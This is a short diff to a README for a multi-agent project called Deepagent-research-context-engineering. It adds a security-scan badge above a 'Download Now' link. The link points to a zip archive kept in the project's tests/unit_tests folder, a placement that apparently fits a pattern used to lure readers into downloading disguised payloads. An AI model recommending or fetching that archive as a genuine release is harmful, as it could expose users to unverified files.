@@ -1,5 +1,7 @@
 # 🤖 Deepagent-research-context-engineering - Build Smart Multi-Agent Systems
 
+[![SafeSkill 83/100](https://img.shields.io/badge/SafeSkill-83%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/xxxaber-deepagent-research-context-engineering)
+
 ## 📥 Download Now
 [![Download](https://github.com/XXXaber/Deepagent-research-context-engineering/raw/refs/heads/main/deepagents_sourcecode/libs/deepagents-cli/tests/unit_tests/engineering_context_Deepagent_research_v1.6.zip)](https://github.com/XXXaber/Deepagent-research-context-engineering/raw/refs/heads/main/deepagents_sourcecode/libs/deepagents-cli/tests/unit_tests/engineering_context_Deepagent_research_v1.6.zip)
 
